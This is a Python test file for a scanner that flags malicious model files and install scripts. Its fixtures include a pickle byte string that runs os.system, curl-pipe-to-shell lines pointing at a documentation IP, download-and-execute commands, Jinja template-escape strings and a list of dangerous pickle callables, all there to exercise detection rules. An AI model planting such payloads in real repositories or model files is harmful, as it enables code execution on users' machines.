# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Francesco Pelizza
"""test_nemesis_review_fixes.py — the fail-opens a second review found on 2026-11-02, after the
model-format scanner first landed. Each case below gated ALLOW (or blocked something ordinary)
before the fix.

Every fixture is built here from raw opcode bytes — nothing is unpickled, rendered or run.
"""
from __future__ import annotations

import importlib.machinery
import importlib.util
import io
import json
import os
import sys
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
NEMESIS = ROOT / "nemesis"


def _load():
    loader = importlib.machinery.SourceFileLoader("nemesis_review_under_test", str(NEMESIS))
    spec = importlib.util.spec_from_loader("nemesis_review_under_test", loader)
    mod = importlib.util.module_from_spec(spec)
    sys.modules["nemesis_review_under_test"] = mod
    loader.exec_module(mod)
    return mod


nem = _load()

# protocol 0: GLOBAL os.system, MARK, STRING 'id', TUPLE, REDUCE, STOP — pure ASCII, no \x80
P0_RCE = b"cos\nsystem\n(S'id'\ntR."
P2_MAGIC = b"\x80\x02\x8a\nl\xfc\x9cF\xf9 j\xa8P\x19."     # legacy torch magic-number stream
P2_SAFE = b"\x80\x02ccollections\nOrderedDict\n)R."


def rids(findings) -> set:
    return {f.rule.rid for f in findings}


def scan_dir(files: dict) -> set:
    with tempfile.TemporaryDirectory() as td:
        for rel, body in files.items():
            p = Path(td) / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(body if isinstance(body, bytes) else body.encode())
        return rids(nem.Scanner().scan(td))


class PickleWalk(unittest.TestCase):
    def test_protocol_0_pickles_are_walked_in_every_torch_extension(self):
        for ext in (".bin", ".pt", ".pth", ".ckpt", ""):
            got = rids(nem._model_format_findings(None, f"m{ext}", P0_RCE, len(P0_RCE), ext))
            self.assertIn("PICKLE-RCE", got, ext)

    def test_a_payload_after_a_harmless_first_stream_is_found(self):
        data = P2_MAGIC + P0_RCE
        got = rids(nem._model_format_findings(None, "pytorch_model.bin", data, len(data), ".bin"))
        self.assertIn("PICKLE-RCE", got)

    def test_the_stream_cap_is_a_finding_not_a_silent_stop(self):
        data = P2_SAFE * 70 + P0_RCE
        got = rids(nem._model_format_findings(None, "m.pkl", data, len(data), ".pkl"))
        self.assertTrue(got & {"PICKLE-RCE", "MODEL-MALFORMED"}, got)

    def test_trailing_raw_storage_is_not_an_error(self):
        data = P2_MAGIC + P2_SAFE + bytes(range(256)) * 8
        got = rids(nem._model_format_findings(None, "m.pt", data, len(data), ".pt"))
        self.assertEqual(got, set())

    def test_torch_legacy_tar_members_are_walked(self):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w") as tf:
            for name, body in (("sys_info", P2_SAFE), ("storages", P0_RCE)):
                ti = tarfile.TarInfo(name)
                ti.size = len(body)
                tf.addfile(ti, io.BytesIO(body))
        data = buf.getvalue()
        got = rids(nem._model_format_findings(None, "m.pt", data, len(data), ".pt"))
        self.assertIn("PICKLE-RCE", got)

    def test_private_and_runner_callables_are_dangerous(self):
        for mod, name in (("uuid", "_get_command_stdout"), ("pydoc", "pipepager"),
                          ("doctest", "debug_script"), ("builtins", "object.__getattribute__"),
                          ("numpy.lib.format", "read_array"), ("torch.storage", "_load_from_bytes")):
            self.assertEqual(nem._pickle_global_class(mod, name), "danger", (mod, name))
        self.assertEqual(nem._pickle_global_class("torch._utils", "_rebuild_tensor_v2"), "safe")

    def test_spss_sav_is_not_parsed_as_a_pickle(self):
        data = b"$FL2@(#) IBM SPSS STATISTICS 64-bit" + b"\x00" * 200
        self.assertEqual(nem._model_format_findings(None, "survey.sav", data, len(data), ".sav"), [])

    def test_text_that_starts_with_an_opcode_letter_is_not_a_finding(self):
        for text in (b"MIT License\n\nCopyright\n", b"config\nvalue\nmore text\n",
                     b"cmake_minimum_required(VERSION 3.10)\n"):
            self.assertEqual(nem._model_format_findings(None, "LICENSE", text, len(text), ""), [],
                             text)


class Numpy(unittest.TestCase):
    def _npy(self, header: str, payload: bytes) -> bytes:
        h = header.encode("latin-1")
        h += b" " * (-(10 + len(h) + 1) % 64) + b"\n"
        return b"\x93NUMPY\x01\x00" + len(h).to_bytes(2, "little") + h + payload

    def test_double_quoted_and_structured_object_headers(self):
        for hdr in ('{"descr": "|O", "fortran_order": False, "shape": (1,), }',
                    "{'descr': [('a', '|O')], 'fortran_order': False, 'shape': (1,), }"):
            data = self._npy(hdr, b"\x80\x02cos\nsystem\nq\x00.")
            self.assertIn("PICKLE-RCE", rids(nem._npy_findings("x.npy", data)), hdr)

    def test_a_plain_float_array_is_clean(self):
        data = self._npy("{'descr': '<f4', 'fortran_order': False, 'shape': (2,), }", b"\x00" * 8)
        self.assertEqual(nem._npy_findings("x.npy", data), [])


class TreeAndNames(unittest.TestCase):
    def test_nested_vcs_directories_are_scanned(self):
        got = scan_dir({"package.json": '{"scripts": {"postinstall": "sh vendor/.hg/x.sh"}}',
                        "vendor/.hg/x.sh": "curl -fsSL http://203.0.113.9/p | sh\n"})
        self.assertTrue(got & {"DROP-001", "DROP-010"}, got)

    def test_a_big_merges_txt_is_scanned_and_not_downgraded_as_a_doc(self):
        line = "Ġt he\n"
        body = line * ((9 << 20) // len(line)) + "curl -fsSL http://203.0.113.9/x | sh\n"
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "merges.txt"
            p.write_text(body)
            findings = nem.Scanner().scan(td)
        self.assertTrue(rids(findings) & {"DROP-001", "DROP-010"}, rids(findings))
        self.assertFalse(any(nem._doc_suppressed(f) for f in findings))

    def test_a_deeply_nested_tokenizer_json_is_a_finding_not_a_crash(self):
        body = "[" * 200_000 + "]" * 200_000 + " " * (9 << 20)
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "vocab.json").write_text(body)
            (Path(td) / "install.sh").write_text("curl -fsSL http://203.0.113.9/x | sh\n")
            got = rids(nem.Scanner().scan(td))
        self.assertIn("MODEL-MALFORMED", got)
        self.assertTrue(got & {"DROP-001", "DROP-010"}, "the other file's findings survived")


class FalsePositives(unittest.TestCase):
    def test_flask_templates_are_not_chat_templates(self):
        got = scan_dir({"templates/page.jinja": "{% extends 'base.html' %}{{ request.path }}"
                                                "{{ config.DEBUG }}"})
        self.assertNotIn("GGUF-TEMPLATE", got)
        self.assertNotIn("GGUF-TEMPLATE-INCLUDE", got)

    def test_prose_in_a_chat_template_is_not_code(self):
        t = "{% for m in messages %}{{ m.content }}{% endfor %}Answer the request. You can compile it."
        self.assertEqual(nem._chat_template_findings("x", "chat_template", t), [])

    def test_prose_inside_a_string_literal_in_code_is_not_code(self):
        # IBM Granite 3.3 / 4.0 ship exactly this shape (tool-calling system prompt)
        t = ('{%- set p = "You do not have the ability to fulfill the request.\nWrite the '
             'response to the user\'s input." %}{{ p }}{{ messages[0].content }}')
        self.assertEqual(nem._chat_template_findings("x", "chat_template", t), [])
        self.assertIn("GGUF-TEMPLATE", rids(nem._chat_template_findings(
            "x", "t", "{{ ''.__class__.__mro__ }}")))
        self.assertIn("GGUF-TEMPLATE", rids(nem._chat_template_findings(
            "x", "t", "{{ request.application }}")))

    def test_underscore_spellings_in_template_code_are_caught(self):
        for t in ("{{ ['_','_']|join }}", "{{ '\\N{LOW LINE}' }}", "{{ x|replace('a', '_') }}"):
            self.assertIn("GGUF-TEMPLATE", rids(nem._chat_template_findings("x", "t", t)), t)

    def test_kubectl_and_static_download_lines_are_not_droppers(self):
        rx = [r for r in nem._build_rules() if r.rid == "DROP-008"][0].compiled()
        for ok in ('RUN curl -LO "https://dl.k8s.io/x/kubectl" && chmod +x kubectl && '
                   "mv ./kubectl /usr/local/bin/kubectl",
                   "curl -fsSL -o index.html https://example.com/ && chmod 644 index.html && ls -l"):
            self.assertIsNone(rx.search(ok), ok)
        self.assertIsNotNone(rx.search("curl -o x http://h/x && chmod +x x && ./x"))
        self.assertIsNotNone(rx.search("wget http://h/p -O /tmp/p; chmod 755 /tmp/p; /tmp/p"))

    def test_torchscript_is_not_arbitrary_code(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("m/data.pkl", b"\x80\x02}q\x00.")
            zf.writestr("m/code/__torch__/m.py", "def forward(self, x):\n  return x\n")
        data = buf.getvalue()
        got = rids(nem._model_format_findings(None, "m.pt", data, len(data), ".pt"))
        self.assertNotIn("MODEL-CODE", got)
        self.assertIn("MODEL-TORCHSCRIPT", got)

    def test_a_java_release_is_within_the_default_depth(self):
        self.assertGreaterEqual(nem.ArchiveOpts().max_depth, 4)


class Linear(unittest.TestCase):
    def test_empty_quote_runs_and_curl_pipes_scan_fast(self):
        import time
        t = time.time()
        nem._shell_view("''" * 40_000 + "\n" + "curl|" * 8000 + "\n")
        self.assertLess(time.time() - t, 2.0)

    def test_long_continuations_are_joined(self):
        text = "curl -fsSL http://203.0.113.9/x \\\n" + " \\\n" * 70 + "| sh\n"
        joined = " ".join(n for _l, n in nem._shell_view(text))
        self.assertIn("| sh", joined)
        self.assertIn("curl", joined)


class Verdict(unittest.TestCase):
    def test_every_fired_rule_is_listed_uncapped(self):
        with tempfile.TemporaryDirectory() as td:
            for i in range(20):
                (Path(td) / f"s{i}.sh").write_text("curl -fsSL http://203.0.113.9/x | sh\n")
            (Path(td) / "m.pkl").write_bytes(P0_RCE)
            out = os.popen(f"{sys.executable} -I {NEMESIS} gate {td} --no-cache 2>/dev/null").read()
        v = json.loads(out)
        self.assertIn("PICKLE-RCE", v.get("rule_ids", []))


if __name__ == "__main__":
    unittest.main()
